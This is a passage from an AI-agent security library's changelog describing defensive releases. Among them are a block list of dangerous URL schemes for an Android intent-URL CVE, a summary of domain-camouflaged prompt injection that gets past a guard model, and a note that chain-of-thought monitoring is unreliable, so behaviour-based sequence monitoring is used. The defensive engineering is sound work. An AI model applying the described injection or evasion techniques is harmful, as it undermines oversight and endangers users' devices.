  (top-level `resourceSpans[*].scopeSpans[*].spans[*]`). Span `name`
  is the tool name; the OTLP `AnyValue` union (`stringValue` /
  `boolValue` / `intValue` / `doubleValue`) is decoded for attribute
  lookup. `agent_id` is resolved span-attrs → resource-attrs →
  `__anonymous__`. Spans carrying `airlock.blocked=true` are skipped.

**Diff semantics.** The matcher is `fnmatch.fnmatch` — the same glob
semantics `SecurityPolicy.check_tool_allowed` uses internally, so the
suggested tightened allow-list admits exactly the tools the agent was
observed calling (asserted by
`test_glob_matching_matches_securitypolicy_semantics`). Denied-list
patterns are forwarded unchanged to the suggestion — denials are
*intent*, not usage data.

Surfaces:

- `agent_airlock.cli.explain` — new module:
  - `main(argv) -> int` argparse entrypoint with `--unused-scopes`,
    `--policy <file>`, `--trace <file>`, `--format {table,json}`,
    `--suggest-policy`.
  - `CallObservation`, `AgentUsageReport`, `PolicySnapshot` dataclasses.
  - `load_trace(path)`, `load_policy(path)`,
    `diff_granted_vs_used(policy, observations)`,
    `suggest_tightened_policy(report, denied_tools)` as testable
    pure-function building blocks.
- `pyproject.toml` — **new** `[project.scripts]` block. This is the
  project's first installable console-script; it wires **only**
  `airlock-explain`. Existing `airlock <subcommand>` invocations
  (baseline / attest / corpus-bench / etc.) remain invocable only via
  `python -m agent_airlock.cli.<name>` — wiring those is a separate
  larger PR.

**Tests.** 28 new tests in `tests/cli/test_explain.py` cover format
detection (JSONL vs OTLP auto-detect, including the
"starts-with-`{`-but-isn't-OTLP" edge case), policy loader (TOML +
JSON, root + nested `[policy]` section, schema rejection), trace
loader (JSONL header / blank skip, missing agent_id fallback, OTLP
attribute kinds, blocked-call exclusion under both formats), the
per-agent unused-set diff (incl. parity with
`SecurityPolicy.check_tool_allowed`), the suggested-policy shape, and
the CLI end-to-end (table format, JSON format, OTLP-vs-JSONL output
parity, `--suggest-policy` appends without truncating, **read-only
contract: policy file is byte-identical before and after**, error
paths for missing files / missing flag).

Zero new runtime deps. The base install grows by one optional dep
nothing — Python 3.10 falls back to `tomli` via the existing
`[project.dependencies]` entry; 3.11+ uses stdlib `tomllib`.

Version bump 0.8.12 → 0.8.13 (additive new CLI surface; no API break).

---

## [0.8.12] - 2026-05-30 — "Behavioral tool-call sequence guard (arXiv:2605.27901)"

### Added — Behavioral tool-call sequence guard (v0.8.12)

`SequenceGuard` — an opt-in behavioral-only sequence anomaly guard that
watches the **ordered stream of tool calls** within a session and flags
divergence from a declared expected order. By construction it does
**not** read the model's reasoning trace — Onyame et al.
*The Fragility of Chain-of-Thought Monitoring Across Typologically
Diverse Languages* ([arXiv:2605.27901](https://arxiv.org/abs/2605.27901),
May 2026) reports an average **95.9% CoT unfaithfulness across 8B–120B
models**, so trusting the model's stated reasoning to detect
misbehavior is not viable; trusting its behavior is.

Two modes:

- **DECLARED.** Operator supplies a permitted-transition DAG
  (`{from_tool: {allowed_next_tools}}`, with `"__entry__"` listing
  tool names permitted as the first call). Any transition not in the
  DAG is a `SequenceViolation`. Deny-by-default.
- **BASELINE.** Guard maintains a per-session-key Markov transition
  profile in a local JSON file (no cloud, no PII — only tool names
  and SHA-256 *shape hashes* of `(arg types, kwarg names+types)`,
  **never argument values**) and flags transitions with observed
  `P(curr | prev) < low_probability_threshold` once the sample size
  from `prev` reaches `min_baseline_samples`. Atomic temp-file +
  rename on persist.

Per-call `action`: `"block"` (default — raises `SequenceViolation`,
routed through the existing `handle_policy_violation` path so existing
deployments see no new error shape) or `"warn"` (logs via structlog +
emits the OTel attribute, lets the call proceed).

OTel: every flagged transition sets attributes on the current span via
the existing `observability` provider —
`airlock.sequence_guard.mode`, `.from_tool`, `.to_tool`,
`.session_key`, and (baseline mode) `.observed_probability`.
Telemetry failures are swallowed so they cannot break enforcement.

Surfaces:

- `agent_airlock.sequence_guard` — new module:
  - `SequenceGuard` (`@dataclass`, thread-safe, `threading.Lock`).
  - `SequenceViolation(PolicyViolation)` — preserves the existing
    error-handler chain.
  - `args_shape_hash(args, kwargs) -> str` — privacy-preserving stable
    hash of `(arg types, kwarg names+types)`.
  - `ENTRY_SENTINEL`, `PREV_NONE_SENTINEL`, mode/action enums.
- `agent_airlock.policy.SecurityPolicy.sequence_guard: SequenceGuard | None = None`
  — new optional field; default `None` preserves v0.8.11 behavior
  exactly.
- `agent_airlock.core.Airlock._check_sequence_guard(...)` — new private
  Step 2.5 in the `@Airlock` pre-execution pipeline. Runs right after
  the standard policy check; routes a block decision through the
  existing `handle_policy_violation` → `on_blocked` callback chain.

Disambiguation: this is **not** `agent_airlock.anomaly.AnomalyDetector`
(which monitors call **rate** / endpoint **diversity** / **error rate** /
**consecutive blocked** over sliding windows). `SequenceGuard` is a
per-transition **ORDER** signal; `AnomalyDetector` is an aggregate
per-window signal. They are complementary — an attacker who keeps the
rate flat but reorders calls slips past `AnomalyDetector`; an attacker
who hammers a single permitted transition slips past `SequenceGuard`.

Tests: 36 tests in `tests/test_sequence_guard.py` covering
`args_shape_hash` invariants (value invariance, arity/type/keyword
sensitivity, order-independence), construction validation (mode,
action, DAG entry-sentinel, threshold range, min-samples positivity),
declared-DAG semantics (entry, transitions, per-session isolation,
warn vs block), baseline cold-start (no flag below min-samples),
baseline flagging (rare transition post warmup), baseline non-flag for
the high-probability path, baseline JSON privacy guarantee (no
argument values on disk), baseline round-trip from disk, OTel
attribute emission, OTel failure swallowed, thread-safe concurrent
record_and_check, and `@Airlock` end-to-end (clean run / block-mode
DAG violation / warn-mode no-block).

Zero new runtime deps. Pydantic-only core stays intact.

---

## [0.8.11] - 2026-05-28 — "ModalBackend sandbox (#30)"

### Added — ModalBackend sandbox (v0.8.11, issue #30)

`ModalBackend(SandboxBackend)` — opt-in sandbox backend that delegates
execution to [Modal](https://modal.com/) sandboxes via the official
Python SDK. Closes part of issue #30 (Daytona remains open).

`pip install "agent-airlock[modal]"`

```python
from agent_airlock.sandbox_backend import ModalBackend
from agent_airlock import AirlockConfig

backend = ModalBackend(
    app_name="my-airlock-sandbox",
    image_ref="python:3.11-slim",
    cpu=0.5,
    memory_mb=512,
    timeout_s=30,
)
config = AirlockConfig(sandbox_backend=backend)
```

**Constructor:** `ModalBackend(app_name, image_ref, cpu=0.5,
memory_mb=512, timeout_s=30, network_policy=None)`. Resource params
are validated `> 0` at construction; non-positive values raise
`ValueError`.

**Execute path:** the call target is `cloudpickle`-serialised,
base64-wrapped, and shipped to a freshly-created Modal sandbox running
`image_ref`. The sandbox harness decodes, invokes, prints a
sentinel-prefixed result envelope, and exits. The backend parses the
envelope into a `SandboxResult` and terminates the sandbox in a
`finally` block (so a partial run never leaks a long-lived sandbox).

**Isolation model.** Modal sandboxes run under **gVisor**
(kernel-syscall filtering); the Modal SDK does not expose `cap_drop`,
`cap_add`, `seccomp`, or `no-new-privileges`. Container-capability
posture is therefore **not** modeled here — if your threat model needs
that, keep using `DockerBackend`. Network egress is the one
configurable isolation knob, and it defaults to fail-closed.

**NetworkPolicy → Modal mapping:**

- `network_policy is None` → `block_network=True` (default — matches
  agent-airlock's deny-by-default posture).
- `policy.allow_egress is False` → `block_network=True`.
- `policy.allow_egress is True` → `block_network=False`. Hostname
  entries in `policy.allowed_hosts` are **not** forwarded to Modal
  (their API is CIDR-only); the backend emits a structlog warning and
  the operator is expected to re-state hostname constraints at the
  Airlock policy layer.

**Auto-selection.** `ModalBackend` is **not** added to the
`get_default_backend()` priority chain (E2B → Docker → Local stays the
default flow). Calls that don't explicitly construct a `ModalBackend`
see exactly v0.8.10 behavior — confirmed by a new regression test
(`TestModalBackendNotAutoSelected`).

**Tests.** 16 new tests under `tests/test_sandbox_backend.py` cover:
constructor validation (cpu / memory_mb / timeout_s > 0), name +
availability detection, all four NetworkPolicy mapping cases (incl.
the hostname-allowlist warn-and-allow path), happy-path execute with
a mocked Modal SDK, failure-envelope handling, missing-envelope
defensive return, `modal.Sandbox.create` raising, missing-extra
actionable error, and the no-auto-select regression. No live Modal
calls in CI — the Modal SDK is fully mocked via
`patch.dict(sys.modules, {"modal": MagicMock()})`.

**Packaging.** New `[modal]` extra in `pyproject.toml`:
```
modal = ["modal>=0.65", "cloudpickle>=3.0"]
```
The base install does not pay for the Modal SDK; `import modal` is
lazy (inside `is_available()` / `execute()`) and falls through to a
clear actionable error if the extra is missing.

---

## [0.8.10] - 2026-05-28 — "MCP Attested Tool-Server Admission preset (arXiv:2605.24248)"

### Added — MCP Attested Tool-Server Admission preset (v0.8.10)

`mcp_attested_admission_defaults()` — an opt-in deny-by-default preset
that closes the host-side trust gap left by the MCP spec, per
[arXiv:2605.24248](https://arxiv.org/abs/2605.24248) ("Attested
Tool-Server Admission", Metere, May 2026). Before any MCP tool is
dispatched, the host:

1. **Fetches** a JWS-compact clearance assertion from
   `{server_url}/.well-known/mcp-clearance` (path configurable via
   `clearance_well_known_path`). Stdlib `urllib` by default; operators
   inject a custom `fetcher` callable for mTLS / IPC / on-disk
   transports.
2. **Verifies** the offline signature against an **operator-pinned
   trust root** — Ed25519 PEM, RSA-PSS PEM, or a JWKS (OKP/RSA). The
   trust root is supplied to `AttestedAdmissionConfig` at process
   startup and **never network-fetched on the hot path**.
3. **Admits** the call iff the tool name is in the verified per-server
   allowlist AND the clearance `sub` matches the dispatched
   `server_id` — admitting a server is not the same as trusting its
   every tool. Stale-`iat` and past-`exp` clearances are rejected.
4. **Emits** every admission decision as a
   `ReceiptVerdict(guard="mcp_attested_admission", ...)` so the
   existing `airlock attest` DSSE pipeline picks decisions up
   unchanged — this preset does **not** invent a new log.

Flavor-gated enforcement: `ENFORCE` (default) hard-denies on missing /
invalid / expired clearance; `WARN` logs and admits, for staged
turn-up against real traffic.

Surfaces:

- `agent_airlock.mcp_spec.attested_admission` — new module:
  - `AttestedAdmissionConfig` dataclass (config surface
    `clearance_well_known_path`, `trust_root`, `enforcement_mode`,
    `max_clearance_age`, `fetcher`, `clock`).
  - `TrustRoot` with `ed25519_pem` / `rsa_pem` / `jwks` (exactly one).
  - `verify_clearance(blob, cfg) -> AdmittedClearance` — pure-offline
    JWS verifier.
  - `admit_tool(...) -> AdmissionDecision` — pure decision function.
  - `admit_server_tool(...) -> AdmissionDecision` — orchestrator
    (fetch → verify → admit).
  - `ClearanceVerificationError` hierarchy
    (`MissingClearance` / `InvalidClearanceSignature` / `ExpiredClearance` /
    `MalformedClearance` / `ToolNotAdmitted`).
- `agent_airlock.policy_presets.mcp_attested_admission_defaults(...)` —
  named factory, deny-by-default. Listed by `policy_presets.list_active()`.
- `agent_airlock.mcp_proxy_guard.MCPProxyConfig.attested_admission:
  AttestedAdmissionConfig | None = None` — new optional field;
  default `None` preserves v0.8.9 behavior exactly.
- `MCPProxyGuard.audit_tool_admission(*, server_url, server_id, tool_name)
  -> AdmissionDecision` — chokepoint that mirrors `audit_response_headers`
  / `audit_oauth_exchange`: never raises on a deny, always returns the
  decision.

Failure model: **fail closed.** ENFORCE denies on any verification
error. Tests cover signed-valid (admit allowlisted / deny
non-allowlisted), tampered signature, stale `iat`, explicit `exp` in
past, missing well-known doc, and subject mismatch — under both
ENFORCE and WARN — plus RSA-PSS and JWKS trust roots and the
`MCPProxyGuard` integration path.

Packaging:

- New `[attested]` extra in `pyproject.toml`:
  `pip install "agent-airlock[attested]"` pulls in `cryptography>=42.0`
  for offline Ed25519 / RSA-PSS verification. The base install stays
  zero-runtime-dep — the `cryptography` import inside
  `attested_admission` is lazy and raises a clear actionable error if
  the extra is missing.

This preset is **strictly opt-in**: existing default presets are
unchanged. No-pivot: deny-by-default posture stays, zero-runtime-dep
core stays.

---

## [0.8.9] - 2026-05-26 — "Opt-in Indic PII masking (Verhoeff + Devanagari)"

### Added — Opt-in Indic PII masking: Verhoeff + Devanagari (v0.8.9)

A new `pii_locales` opt-in tag on `sanitize_output()` / `mask_sensitive_data()`
/ `detect_sensitive_data()` / `AirlockConfig`. Defaults to `[]` so the
zero-dep, US-default PII surface is unchanged for existing callers. When
`pii_locales=["in"]` is supplied, three things activate:

1. **Aadhaar Verhoeff checksum gate.** The existing Aadhaar regex
   (`\b[2-9][0-9]{3}[\s-]?[0-9]{4}[\s-]?[0-9]{4}\b`) is permissive —
   any 12-digit number starting 2-9 matches. With the opt-in, each
   match is validated against the UIDAI Verhoeff checksum (the same
   algorithm UIDAI uses to compute the last digit). Cuts the FP rate
   ~10x on random 12-digit IDs / phone numbers.
2. **Devanagari personal-name detection** — new
   `SensitiveDataType.PERSONAL_NAME_DEVANAGARI` enum member. Regex
   matches sequences of 2+ Devanagari word characters (Unicode block
   `U+0900–U+097F`), optionally joined by whitespace. A small
   common-noun allowlist (greetings, pronouns, interrogatives, basic
   connectives, copulas) filters obvious false positives — multi-word
   spans where every token is in the allowlist are dropped. This is a
   conservative heuristic, not NER; production callers who need precise
   name extraction should layer a proper NER on top.
3. **India PII auto-include in `sanitize_output(mask_pii=True)`**:
   Aadhaar / PAN / UPI / IFSC / Devanagari are added to the default
   masked types. Without the locale tag, callers must still pass
   `types=[...]` explicitly to mask India-locale PII — that
   behavior is unchanged.

The existing Aadhaar / PAN / UPI / IFSC enum members, regex patterns,
default mask strategies, and tests are **untouched** — the new gate
is purely additive. Reuses the existing four masking strategies
(`FULL` / `PARTIAL` / `TYPE_ONLY` / `HASH`); no new strategy.

New public exports: `SensitiveDataType.PERSONAL_NAME_DEVANAGARI`,
`AirlockConfig.pii_locales` field. The new `pii_locales` parameter on
`detect_sensitive_data` / `mask_sensitive_data` / `sanitize_output` is
keyword-only by convention (positional callers from before are unaffected).

`pii_locales` is also accepted in TOML config (`pii_locales = ["in"]`
or `pii_locales = "in,us"`).

32 new tests in `tests/test_indic_pii_masking.py` cover: Verhoeff
helper (valid / invalid / non-digit / mutation), Aadhaar locale gate
(opt-in passes valid + drops invalid; no-opt-in keeps permissive
behavior + separator normalization), Devanagari detection (single +
multi-word names; common-noun allowlist FP filtering; mixed
greeting+name spans), `sanitize_output` end-to-end with the locale
extending the default PII set, full `@Airlock` integration via
`AirlockConfig.pii_locales`, and backwards-compatibility (all old
call shapes still work).

---

## [0.8.8] - 2026-05-25 — "CVE-2026-35394 Mobile MCP intent-URL guard"

### Added — CVE-2026-35394 Mobile MCP intent-URL guard preset (v0.8.8)

`mobile_mcp_intent_guard_2026_05` — defensive bundle for **CVE-2026-35394**
([SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-35394/)).
Mobilenexthq Mobile MCP releases prior to **0.0.50** ship a
`mobile_open_url` tool that forwards user-supplied URLs to Android's
intent system without scheme validation, letting attackers fire
`intent:` URIs, USSD codes, phone calls, SMS, and content-provider reads.
The upstream fix is a scheme allowlist; this preset is the agent-airlock
equivalent so callers don't have to wait for an upstream bump.

- **`mobile_mcp_intent_guard_2026_05()`** + eagerly-constructed
  `MOBILE_MCP_INTENT_GUARD_2026_05_DEFAULTS` (`agent_airlock.policy_presets`):
  returns a dict containing a pre-configured
  `SafeURLValidator(allowed_schemes=["http", "https"])`, a `check_url`
  callable, an `AirlockConfig(unknown_args=UnknownArgsMode.BLOCK)`, the
  canonical Mobile MCP tool-name list
  (`mobile_open_url`, `open_url`, `mobile_launch_url`), the documented
  `blocked_schemes` tuple (`intent`, `content`, `file`, `app`, `data`,
  `javascript`, `vbscript`), and the SentinelOne source link.
- **DIFF-COMPATIBLE with `SafeURL`** — the preset reuses the existing
  `SafeURLValidator` (no new validator invented). `SafeURLAllowHttp` would
  also work; the preset adds the canonical tool-name corpus, the
  `UnknownArgsMode.BLOCK` pairing, and the CVE citation.
- New typed exception **`MobileMcpIntentBlocked`** (subclass of
  `AirlockError`) for decorator-side wrapping.
- 34 new regression tests in `tests/test_mobile_mcp_intent_guard_2026_05.py`
  — every URL in the CVE-2026-35394 weaponization corpus (intent/content/
  file/app/data/javascript/vbscript schemes) blocks; benign http(s) URLs
  pass; SSRF defense-in-depth blocks private IPs (10.x/127.x/192.168.x)
  and cloud metadata; end-to-end `@Airlock` integration verifies the
  `UnknownArgsMode.BLOCK` seam closes hallucinated-kwarg smuggling.

### Fixed — `SafeURLValidator.block_private_ips=True` was a no-op for RFC1918 ranges

The validator's `except ValueError: pass` silently swallowed its own
`SafeURLValidationError` raise (which subclasses `ValueError`), so
`block_private_ips=True` only caught the four hard-coded localhost
aliases — not actual private IPs like `10.0.0.5` / `172.16.x.x` /
`192.168.x.x`. Surfaced by the CVE-2026-35394 regression corpus.
One-line fix: hoist the IP-parse out of the `try/except` so the raise
isn't caught. No public API change; tightens an existing SSRF gate.

---

## [0.8.7] - 2026-05-24 — "Per-model-tier cost budgets"

### Added — Per-model-tier cost budgets with deny-by-default fallback (v0.8.7)

`ModelTierBudget` — a new policy primitive that caps per-call cost AND/OR
output tokens per **model tier label** (e.g. `"frontier"` / `"mid"` /
`"small"`), evaluated **before** the tool executes. Distinct from the
existing flat `BudgetConfig` (no tier dimension), `ModelCapabilityTier`
(capability gating, not cost), and `AgentSDKCreditBudget` (monthly
subscription credits, not per-call). Closes the gap routers had when
fanning calls across tiers: a runaway agent can no longer burn frontier
tokens against a small-tier cap.

- **`ModelTierBudget`** (`agent_airlock.cost_tracking`): mapping
  `{tier_label → TierBudget}` plus a mandatory `strict_tier` that serves
  as the deny-by-default fallback for untagged calls. Optional
  `tier_resolver: Callable[[str], str]` callback maps model IDs to tier
  labels — the router stays in the caller's code; airlock just invokes
  the callback. Includes `resolve_tier()`, `check_pre_execute()` (raises
  `AirlockBudgetExceeded` on cap breach), and `reconcile_post_execute()`
  (observability-only — logs the actual-vs-estimated delta but never
  raises).
- **`TierBudget`** (frozen dataclass): per-tier `max_cost_cents` and/or
  `max_output_tokens` caps. Worst-case cost estimate is
  `input_tokens × input_price + max_output_tokens × output_price` —
  reuses `CostTracker.calculate_cost()` for pricing (no duplicate
  pricing table).
- **`AirlockBudgetExceeded`** (subclasses `AirlockError`): pre-execute
  block carrying `tier`, `cap`, `estimated_cost_cents`,
  `estimated_output_tokens`, `budget_type`, `model_id`. Surfaced as a
  structured `AirlockResponse` with `block_reason="budget_exceeded"`.
- **`SecurityPolicy.model_tier_budget`** (new field) +
  **`SecurityPolicy.check_model_tier_budget()`**: optional wiring point.
  The `@Airlock` seam invokes it as Step 6 of `_pre_execution()` (after
  RBAC / capability / filesystem / endpoint checks, before execute), and
  threads the resulting `BudgetEstimate` into `_post_execution()` for
  actual-vs-estimated reconciliation when the tool result carries a
  `token_usage` attribute / dict key. Frozen-policy digest covers the
  budget so frozen policies don't drift on mutation.
- **Tier extraction** at the call site, in priority order:
  `_airlock_tier` kwarg (stripped before ghost-arg validation) →
  arg-extracted `context.metadata["airlock_tier"]` →
  contextvar-stored context's metadata → `tier_resolver(model_id)` →
  `strict_tier`. The strict-tier fallback is the deny-by-default
  guarantee — untagged calls hit the tightest cap.
- **`STRICT_MODEL_TIER_BUDGET`** preset (`policy_presets`): three-tier
  configuration with caps 50¢ / 10¢ / 2¢ (frontier / mid / small) and
  `strict_tier="small"`.
- **`strict_tier_budget_policy(tier_resolver=None)`**: factory returning
  a `SecurityPolicy` seeded with the strict preset.
- New example at `examples/model_tier_budget.py` demonstrating four
  routing patterns: explicit `_airlock_tier` kwarg, `context.metadata`
  tagging via contextvar, `model_id` → `tier_resolver` callback, and
  composition with allow/deny lists.
- `BlockReason.BUDGET_EXCEEDED` and `handle_budget_exceeded()` in
  `self_heal.py` for structured response building.
- 39 new tests in `tests/test_model_tier_budget.py` covering
  construction, tier resolution priority, worst-case cost estimation,
  cap-exceeded blocks, reconciliation observability, full `@Airlock`
  integration (sync + async), and digest stability.

Reconciliation never raises — a call that estimates 5¢ and actually costs
50¢ logs `delta_cents=+45` but doesn't retroactively block. Users who
want a hard session cap should layer `BudgetConfig.max_cost_per_session`
on top of the global `CostTracker`.

---

## [0.8.6] - 2026-05-23 — "`CAMOUFLAGE_RESISTANT` preset + debate-amplification guard"

### Added — `CAMOUFLAGE_RESISTANT` preset + debate-amplification guard (v0.8.6)

Detector-independent defense against domain-camouflaged prompt
injection. Motivated by [arXiv:2605.22001](https://arxiv.org/abs/2605.22001)
("Blind Spots in the Guard", Pai, May 2026): Llama Guard 3 IDR collapses
to **0.000** on payloads that mimic the target document's domain
vocabulary and authority structures, with overall detection dropping
from 93.8% → 9.7% (Llama 3.1 8B) and 100% → 55.6% (Gemini 2.0 Flash).

- **`CAMOUFLAGE_RESISTANT_POLICY`** (`agent_airlock.policy`): empty
  deny-by-default `allowed_tools`, `require_agent_id=True`, capability
  policy denying `PROCESS_SHELL` / `PROCESS_EXEC` / `FILESYSTEM_WRITE` /
  `FILESYSTEM_DELETE`, `reauth_on_untrusted_reinvocation=True` with
  threshold 1, and `default_deny=True` so the empty allowlist behaves
  as deny-all instead of the legacy "allow all" semantic.
- **`apply_camouflage_resistant(config=None, *, allowed_tools=None,
  max_output_chars=4000)`** (`agent_airlock.camouflage_resistant`):
  composition factory that returns a `CamouflageResistantBundle` with
  both the matching `AirlockConfig` (unknown-args BLOCK, sanitization
  on, output cap) and the `SecurityPolicy` carrying your deployment's
  explicit allowlist.
- **`SecurityPolicy.reauth_on_untrusted_reinvocation`** (new field) +
  **`SecurityPolicy.check_reauthorization(tool, context)`** (new method):
  the debate-amplification guard. After a tool's output has flowed back
  into the model context, the next invocation past the threshold
  requires an explicit `AirlockContext.authorize_once(tool)` grant from
  the harness — closing the multi-agent fan-out path the paper
  identifies.
- **`SecurityPolicy.default_deny`** (new field): opt-in flag that makes
  an empty `allowed_tools` behave as deny-all. Off by default to
  preserve `PERMISSIVE_POLICY` behaviour; on under the camouflage-
  resistant preset.
- **`AirlockContext.untrusted_reinvocation_count`** +
  **`mark_untrusted_output(tool)`** + **`authorize_once(tool)`**: state
  + helpers for the debate-amplification guard.
- **`ViolationType.REAUTH_REQUIRED`**: new violation type emitted when
  the guard blocks a reinvocation without a fresh `authorize_once` grant.
- **`build_camouflage_resistant_policy(allowed_tools)`**: builder for
  callers who want the policy alone (without the config bundle).
- New `tests/test_camouflage_resistant.py` (23 cases): preset shape,
  composition factory, camouflaged-injection fixtures blocked on
  structural grounds, ghost-arg BLOCK, reauthorization grant/consume
  semantics, output truncation re-entry, and freeze-digest integrity
  for the two new policy fields (CVE-2026-41349 contract preserved).

The camouflage fixtures in the test suite are local and minimal — the
paper's payload generator is **not** vendored.

---

## [0.8.5] - 2026-05-21 — "Opt-in `LayerContract` (assume/guarantee) block on attest receipts"

Thursday cut on top of v0.8.4. **Patch bump** — one optional field on
the existing receipt schema + one new CLI flag. Schema version stays
at **v1** (the field is additive; legacy receipts deserialise
unchanged). No breaking changes.

### Honest framing up front

The 2026-05-21 prompt asked for the `guarantees` list to be
"populated automatically from the policy outcomes already tracked
this window (deny-by-default hits, ghost-arg strips, PII masks,
validation failures)". **That counter store does not exist** in
agent-airlock. There is no central sliding-window aggregator of
policy outcomes by category.

Inventing one would have been a substantial new abstraction
(threading, persistence semantics, what counts as a "window"). v0.8.5
ships the **derived** path instead: per-guard `pass_rate` is computed
from the `verdicts: list[ReceiptVerdict]` the operator already
supplies to `build_receipt`. Same source of truth as today's
receipts; zero new infrastructure. The window-counter approach can
be added later and would compose with the same `LayerContract` shape.

### ADD

- **`LayerContract` dataclass + `Guarantee` line item** in
  `agent_airlock.attest.receipt`. Frozen dataclasses. `Guarantee`
  carries `name`, `pass_rate` (validated to `[0.0, 1.0]`), and
  `sample_size` so verifiers can weight low-sample-size guarantees
  appropriately. `LayerContract` carries `guarantees: tuple[Guarantee, ...]`
  (sorted by name for canonical-payload stability) and `assumes:
  tuple[str, ...]` (free-form upstream-guarantee identifiers).
- **`derive_contract_from_verdicts(verdicts, *, assumes=())`** pure
  function: per-guard `pass_rate = count(verdict == "allow") /
  total_for_that_guard`. Verdict kinds other than `"allow"` (`warn` /
  `block` / `error`) all count as non-pass.
- **`Receipt.contract: LayerContract | None`** optional field. When
  None, `to_dict()` emits no `contract` key — byte-identical to a
  v0.8.4 receipt; legacy verifiers continue to work.
- **`build_receipt(..., contract=...)`** new kwarg.
- **`receipt_from_dict`** tolerates the new optional field; legacy
  receipts deserialise unchanged.
- **CLI `airlock attest receipt emit --contract`** new opt-in flag
  derives the contract block from the verdicts JSON and embeds it
  in the signed payload.
- **CLI `--assumes id1,id2,...`** comma-separated upstream-guarantee
  identifiers; rejected with non-zero exit if supplied without
  `--contract`.

### Anchor

arXiv:2605.18672 — "assume-guarantee layer contract" framing. Cited
in the README and the new doc page; this release does not make
claims about the paper's specific content beyond adopting the
terminology.

### Doc

`docs/attest/layer-contract.md` — full surface description with the
honest-scope section called out (window-counter store does not exist;
`pass_rate` is a measured statistic, not a proof; signature attests
the operator's declaration, not the verdicts' truth).

### Tests

- `tests/attest/test_layer_contract.py` — 17 cases (Guarantee +
  LayerContract shape, derive math, sorted-name canonical ordering,
  Receipt round-trip with + without contract, signature verifies
  with contract, JSON round-trip, back-compat on legacy receipts).
- `tests/attest/test_cli_contract.py` — 6 cases (CLI emit with/
  without flag, signature round-trips through verify subcommand,
  `--assumes` propagates, `--assumes` without `--contract` is a
  usage error, legacy emit still parseable).

### Surface additions (`agent_airlock.attest.__all__`)

- `Guarantee`
- `LayerContract`
- `derive_contract_from_verdicts`

### Carry-over (unchanged from v0.8.4)

- v0.8.4: `requires_human_oversight`, `InProcessRecordedApprover`,
  oversight protocol shapes
- v0.8.3: `classify_sdk_lineage`, `CategoryCount`
- v0.8.2: `MetisInspiredCorpusBlockRateGuard`, `airlock corpus-bench`
- v0.8.1: `OpenAPIDriftGuard`, `vaccinate_openapi`
- v0.8.0: `EvalRCEGuard`, `InspectorExposureGuard`, `AgentSDKCreditBudget`

---

## [0.8.4] - 2026-05-20 — "Human-oversight decorator (Code-as-Harness anchor)"

Wednesday cut on top of v0.8.3. **Patch bump** — one new public
decorator + protocol shapes. No breaking changes.

### Honest framing up front

The 2026-05-20 Product Improvements doc proposed an
``@requires_human_oversight`` decorator backed by a new
``audit_emitter.await_response(request_id, timeout=...)``
**bidirectional RPC channel**. agent-airlock's existing audit
emitter is one-way (emit-only, sinks to log/OTel/file). Grafting a
request/response channel onto a sink would have invented a new
transport abstraction inside the library.

Honest reframe: **operator-supplied approver callable**, identical
in shape to the v0.8.1 `vaccinate_openapi(spec)`, v0.8.3
`classify_sdk_lineage(...)` building-block pattern. agent-airlock
ships the decorator + protocol shapes; the operator wires the
transport (Slack, PagerDuty, CLI prompt, whatever).

### ADD

- **`@requires_human_oversight` decorator** in
  `agent_airlock.oversight`. Gates a sync tool function on an
  operator-supplied approver callable:

  ```python
  @requires_human_oversight(approver=my_approver, channel="prod-deploys")
  def deploy_to_prod(version: str) -> str: ...
  ```

  Behaviour:
  - Approver returns `GRANT` → wrapped function called.
  - Approver returns `DENY` → `OversightDeniedError` raised
    (carrying the request + response for audit).
  - Approver returns `TIMEOUT` → `OversightTimeoutError` raised.
  - Approver returns response with mismatched `request_id` →
    `ValueError` (protocol fault, catches buggy approvers loudly).

  Composes with `@Airlock(policy=...)` — stack the oversight gate
  outside the airlock decorator so human approval fires before
  policy validation.

- **Pure data shapes (frozen dataclasses):**
  - `OversightRequest` — request_id (UUID4), tool_name, args
    (`{"args": tuple, "kwargs": dict}`), channel, timeout_seconds,
    requested_at (ISO 8601 UTC).
  - `OversightResponse` — request_id (must echo), verdict, detail,
    optional approver identifier.
  - `OversightVerdict` enum — `GRANT` / `DENY` / `TIMEOUT`.

- **Exception types:** `OversightDeniedError`,
  `OversightTimeoutError` (both carry the originating request).

- **`InProcessRecordedApprover` testing helper.** Returns pre-set
  verdicts per tool name; unrecorded tools default to `TIMEOUT` so
  tests fail loudly. Records every request received on a `calls`
  list for assertion.

- **Audit events.** When `audit_emitter` is supplied (one-way sink
  matching the existing API shape), the decorator emits
  `oversight.request|grant|deny|timeout` events with structured
  payloads. The same events also flow through the module's
  structlog logger regardless of `audit_emitter` wiring.

  Doc: `docs/policies/human-oversight-decorator.md`.

  Tests: 21 cases in `tests/test_oversight.py` covering grant/deny/
  timeout, kwargs passing, request_id round-trip, protocol-fault
  detection, approver context (tool_name, args, channel,
  timeout_seconds, requested_at), audit-emitter event types,
  data-shape invariants, decorator hygiene (functools.wraps),
  `InProcessRecordedApprover` behaviour, construction-time
  validation.

### NOTE — Suggestion 2 logged to ROADMAP

The 2026-05-20 doc proposed a Co-Scientist-style multi-agent
supervisor adapter (anchored on Nature 2026-05-19). The doc itself
tagged it `[major-needs-decision]` and deferred the prompt. v0.8.4
does not include it — the strategic question is logged at
`ROADMAP_2026.md#post-v084-strategic-question-2026-05-20`.

The doc's framing of S2 as a "per-vendor vs per-framework" question
was inaccurate — agent-airlock already ships vendor-specific
adapters (`gemini3_tool_shape_adapter.py`, `gpt5_5_tool_shape_adapter.py`,
`anthropic_claude_agent_sdk.py`). The real question reframed in the
roadmap log: **"should we add a multi-agent-topology adapter shape
distinct from the existing single-agent tool-shape adapters?"**

### Surface additions (`__all__`)

- `requires_human_oversight`, `Approver`, `InProcessRecordedApprover`
- `OversightRequest`, `OversightResponse`, `OversightVerdict`
- `OversightDeniedError`, `OversightTimeoutError`

### Carry-over (unchanged from v0.8.3)

- v0.8.3: `classify_sdk_lineage`, `CategoryCount`
- v0.8.2: `MetisInspiredCorpusBlockRateGuard`, `airlock corpus-bench`
- v0.8.1: `OpenAPIDriftGuard`, `vaccinate_openapi`
- v0.8.0: `EvalRCEGuard`, `InspectorExposureGuard`, `AgentSDKCreditBudget`

---

## [0.8.3] - 2026-05-19 — "Stainless SDK provenance classifier + corpus per-category coverage (HarnessAudit-Bench taxonomy)"

Tuesday cut on top of v0.8.2. **Minor bump** — one new public
classifier (`classify_sdk_lineage`), one corpus schema extension
(per-category counts). No breaking changes.

### Honest framing up front

This release responds to two upstream signals — Anthropic's
